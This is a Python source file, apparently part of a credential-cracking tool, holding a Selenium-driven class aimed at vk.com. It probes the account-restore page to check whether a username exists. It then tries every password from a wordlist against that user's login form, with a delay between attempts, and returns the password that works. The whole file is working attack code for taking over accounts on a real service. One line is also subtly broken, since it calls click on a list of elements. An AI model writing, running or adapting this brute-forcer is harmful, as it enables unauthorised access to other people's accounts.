import time

class Vk:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.wordlist = wordlist
        self.delay = delay
        self.url = 'https://vk.com/login'

    def check_user(self):
        self.browser.driver.get('https://vk.com/restore')
        try:
            input = self.browser.driver.find_element_by_id('login_input')
            input.clear()
            input.send_keys(self.username)
            self.browser.driver.find_element_by_id('submitBtn').click()
            msg = self.browser.driver.find_element_by_xpath('//div[@class="msg_text"]')
            if msg:
                return False
            else:
                return True
        except:
            return False
        
    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        for password in passwords:
            self.browser.driver.get(self.url)
            email = self.browser.driver.find_element_by_id('email')
            email.send_keys(self.username)
            pwd = self.browser.driver.find_element_by_id('pass')
            pwd.send_keys(password)

            self.browser.driver.find_elements_by_id('login_button').click()

            url = self.browser.driver.current_url
            if not url.startswith(self.url):
                found = password
                break
            time.sleep(self.delay)

        return found